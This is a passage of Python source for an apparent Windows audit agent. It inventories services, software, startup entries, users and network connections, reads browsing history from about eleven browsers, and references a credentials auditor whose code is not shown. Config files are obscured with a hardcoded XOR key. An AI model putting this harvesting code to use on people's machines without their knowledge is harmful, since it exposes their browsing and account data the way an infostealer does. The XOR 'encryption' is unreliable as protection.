                    try:
                        info = s.as_dict()
                        # Lọc bỏ các service hệ thống mặc định nếu muốn (ở đây giữ nguyên logic cũ là lấy hết)
                        # Logic cũ: Lọc bỏ các service nằm trong system32
                        path_name = info.get("binpath") or ""
                        if path_name and "\\Windows\\system32\\" in path_name.lower():
                            continue

                        status = info.get("status", "Unknown")
                        if status not in grouped:
                            grouped[status] = []
                        
                        grouped[status].append({
                            "Name": info.get("name"),
                            "DisplayName": info.get("display_name"),
                            "State": status,
                            "StartMode": info.get("start_type"),
                            "PathName": path_name
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                self._details = grouped
            except Exception as e:
                self._details = {"Error": f"Could not get service info via psutil: {e}"}
            return self._details

    class _SoftwareAudit:
        """Một thư viện thu thập phần mềm đã cài đặt trên Windows sử dụng winreg (tối ưu hơn PowerShell)."""
        
        def __init__(self):
            self._details: Optional[Dict[str, List]] = None

        def get_details(self) -> Dict[str, List]:
            if self._details is None:
                self._details = self._fetch_and_process()
            return self._details

        def _fetch_and_process(self) -> Dict[str, List]:
            grouped = {"Applications": [], "System": [], "Hotfixes & Updates": []}
            seen_apps = set()
            
            # Các đường dẫn Registry chứa thông tin phần mềm
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
            ]

            for hkey, path in reg_paths:
                try:
                    with winreg.OpenKey(hkey, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    # Lấy các giá trị cần thiết
                                    def get_val(name):
                                        try: return winreg.QueryValueEx(subkey, name)[0]
                                        except: return None

                                    display_name = get_val("DisplayName")
                                    if not display_name: continue
                                    
                                    display_version = get_val("DisplayVersion")
                                    publisher = get_val("Publisher") or ""
                                    install_date = get_val("InstallDate")
                                    install_location = get_val("InstallLocation")
                                    estimated_size = get_val("EstimatedSize")

                                    # Tránh trùng lặp
                                    app_id = (display_name, display_version, publisher)
                                    if app_id in seen_apps: continue
                                    seen_apps.add(app_id)

                                    # Phân loại
                                    category = "Applications"
                                    if "Microsoft Corporation" in publisher:
                                        if re.search(r'\(KB\d+\)', display_name, re.IGNORECASE) or subkey_name.startswith("KB"):
                                            category = "Hotfixes & Updates"
                                        else:
                                            category = "System"

                                    # Định dạng ngày
                                    formatted_date = None
                                    if isinstance(install_date, str) and len(install_date) == 8:
                                        try: formatted_date = f"{install_date[:4]}-{install_date[4:6]}-{install_date[6:]}"
                                        except: pass

                                    # Định dạng dung lượng
                                    size_bytes = None
                                    if estimated_size is not None:
                                        try: size_bytes = int(estimated_size) * 1024
                                        except: pass

                                    grouped[category].append({
                                        "Name": display_name,
                                        "Version": display_version,
                                        "Publisher": publisher or None,
                                        "InstallDate": formatted_date,
                                        "InstallLocation": install_location,
                                        "EstimatedSizeByte": size_bytes
                                    })
                            except: continue
                except: continue

            return {k: v for k, v in grouped.items() if v}

    class _StartupAudit:
        def __init__(self): self._details: Dict[str, List] = {}
        def _fetch(self, script: str, err_msg: str) -> List[Dict[str, Any]]:
            try: return _run_powershell(script, use_bypass=True) or []
            except Exception: return [{"Error": err_msg}]
        def get_details(self) -> Dict[str, List]:
            if self._details: return self._details
            self._details = {
                "Commands": self._fetch("Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User | ConvertTo-Json", "Failed to get Startup Commands."),
                "ScheduledTasks": self._fetch("Get-ScheduledTask | Where-Object { $_.Triggers.TriggerType -contains 'AtLogon' -and $_.State -in 'Ready','Running' } | Select TaskName,TaskPath,State | ConvertTo-Json", "Failed to get Scheduled Tasks."),
                "AutoStartServices": self._fetch("Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike '*\\Windows\\*' } | Select Name,DisplayName,State,PathName | ConvertTo-Json", "Failed to get Auto-Start Services.")
            }
            return self._details

    class _SystemIdAudit:
        def __init__(self): self._details: Dict[str, Any] = {}
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
                val, _ = winreg.QueryValueEx(key, "MachineGuid"); winreg.CloseKey(key)
                self._details = {"MachineGuid": str(val)}
            except Exception as e: self._details = {"Error": str(e)}
            return self._details

    class _UserAudit:
        def __init__(self): self._details: Dict[str, Any] = {}
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            try: current_user = getpass.getuser()
            except Exception as e: current_user = f"Error: {e}"
            try: users = _run_powershell("Get-LocalUser | Select Name,FullName,Enabled,SID | ConvertTo-Json", use_bypass=True)
            except Exception: users = [{"Error": "Could not get local users via PowerShell."}]
            self._details = {"CurrentUser": current_user, "LocalUsers": [users] if isinstance(users, dict) else users}
            return self._details

    class _WebHistoryAudit:
        def __init__(self, limit_per_profile: int = 100):
            self._details, self.limit = {}, limit_per_profile
        def _read_db(self, path: str) -> List[Dict[str, Any]]:
            tmp_db = f"temp_h_{os.path.basename(os.path.dirname(path))}.db"
            if not os.path.exists(path): return []
            try:
                shutil.copy2(path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                c = conn.cursor()
                c.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {self.limit}")
                res = []
                for u, t, ts in c.fetchall():
                    try: visit_time = (datetime(1601, 1, 1) + timedelta(microseconds=ts)).strftime("%Y-%m-%d %H:%M:%S")
                    except (TypeError, OverflowError): visit_time = None
                    res.append({"title": t or "N/A", "url": u, "last_visit_time": visit_time})
                conn.close()
                return res
            except Exception as e: return [{"Error": f"Failed to read {path}: {e}"}]
            finally:
                if os.path.exists(tmp_db): os.remove(tmp_db)
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            paths = {
                "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
                "CocCoc": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
                "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
                "YandexBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
                "Slimjet": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
                "CentBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
                "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
                "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
                "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
            }
            for browser, base_path in paths.items():
                if not os.path.isdir(base_path): self._details[browser] = {"Info": "Not found"}; continue
                self._details[browser] = {}
                profiles = ["Default"] + [d for d in os.listdir(base_path) if d.lower().startswith("profile ")]
                for p_name in profiles:
                    h_path = os.path.join(base_path, p_name, "History")
                    if os.path.exists(h_path): 
                        history_data = self._read_db(h_path)
                        if history_data:
                            self._details[browser][p_name] = history_data
            return self._details

    class _WindowsAudit:
        def __init__(self): self._details: Dict[str, Any] = {}
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            ps_script = "Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture,InstallDate,LastBootUpTime,RegisteredUser,CSName | ConvertTo-Json -Depth 2"
            try:
                data = _run_powershell(ps_script)
                for f in ["InstallDate", "LastBootUpTime"]:
                    if f in data: 
                        dt_obj = _parse_dotnet_json_date(data[f])
                        data[f] = dt_obj.strftime("%Y-%m-%d %H:%M:%S") if dt_obj else None
                self._details = data
            except Exception as e: self._details = {"Error": f"Could not get OS info: {e}"}
            return self._details

    def __init__(self, max_events: int = 25, history_limit_per_profile: int = 100):
        self.auditors = {
            "cpu": self._CpuAudit(), 
            "gpu": self._GpuAudit(), 
            "monitor": self._MonitorAudit(),
            "ram": self._RamAudit(), 
            "disk": self._DiskAudit(),
            "network": self._NetworkAudit(), 
            "mainboard": self._MainboardAudit(), 
            "os": self._WindowsAudit(),
            "system_id": self._SystemIdAudit(), 
            "users": self._UserAudit(), 
            "credentials": self._CredentialAudit(),
            "printers": self._PrinterAudit(), 
            "processes": self._ProcessAudit(), 
            "services": self._ServiceAudit(),
            "startup": self._StartupAudit(), 
            "software": self._SoftwareAudit(),
            "event_log": self._EventLogAudit(max_events=max_events),
            "web_history": self._WebHistoryAudit(limit_per_profile=history_limit_per_profile),
            "connections": self._ConnectionsAudit(),
        }

    class _ConnectionsAudit:
        def __init__(self):
            self._details = []

        def get_details(self):
            import psutil
            import socket
            connections = []
            try:
                for conn in psutil.net_connections(kind='inet'):
                    laddr_str = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-"
                    raddr_str = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
                    status = conn.status
                    pid = conn.pid
                    proc_name = "-"
                    if pid:
                        try:
                            proc = psutil.Process(pid)
                            proc_name = proc.name()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            proc_name = "Unknown"
                    conn_type = "TCP" if conn.type == socket.SOCK_STREAM else "UDP"
                    family = "IPv4" if conn.family == socket.AF_INET else "IPv6"
                    connections.append({
                        "pid": pid or 0,
                        "process_name": proc_name,
                        "local_address": laddr_str,
                        "remote_address": raddr_str,
                        "status": status,
                        "type": conn_type,
                        "family": family
                    })
                self._details = connections
            except Exception as e:
                self._details = [{"Error": f"Could not get connections: {e}"}]
            return self._details


def load_config(config_path):
    """Nạp file config, hỗ trợ giải mã tự động nếu file được mã hóa (bắt đầu bằng ENC:)."""
    import base64
    import configparser
    config = configparser.ConfigParser()
    if not os.path.exists(config_path):
        return config
    
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        def xor_crypt(data: str, key: str = "SM-Key-2026") -> str:
            key_len = len(key)
            return "".join(chr(ord(c) ^ ord(key[i % key_len])) for i, c in enumerate(data))

        content_stripped = content.strip()
        if content_stripped.startswith("ENC:"):
            b64_data = content_stripped[4:]
            encrypted_xor = base64.b64decode(b64_data).decode('utf-8')
            decrypted_content = xor_crypt(encrypted_xor)
            config.read_string(decrypted_content)
        else:
            config.read(config_path, encoding='utf-8')
    except Exception as e:
        print(f"[CONFIG] Load error: {e}, falling back to plain read.")
        try:
            config.read(config_path, encoding='utf-8')
        except Exception:
            pass
    return config


def save_config(config_path, config_obj, encrypt=False):
    """Ghi config ra file, hỗ trợ mã hóa nếu encrypt=True."""
    import base64
    import io
    
    string_io = io.StringIO()
    config_obj.write(string_io)
    plaintext_content = string_io.getvalue()
    
    try:
        if encrypt:
            def xor_crypt(data: str, key: str = "SM-Key-2026") -> str:
                key_len = len(key)
                return "".join(chr(ord(c) ^ ord(key[i % key_len])) for i, c in enumerate(data))
            
            encrypted_xor = xor_crypt(plaintext_content)
            b64_data = base64.b64encode(encrypted_xor.encode('utf-8')).decode('utf-8')
            final_content = f"ENC:{b64_data}"
        else:
            final_content = plaintext_content
            
        with open(config_path, "w", encoding="utf-8") as f:
            f.write(final_content)
        return True
    except Exception as e:
        print(f"[CONFIG] Save error: {e}")
        return False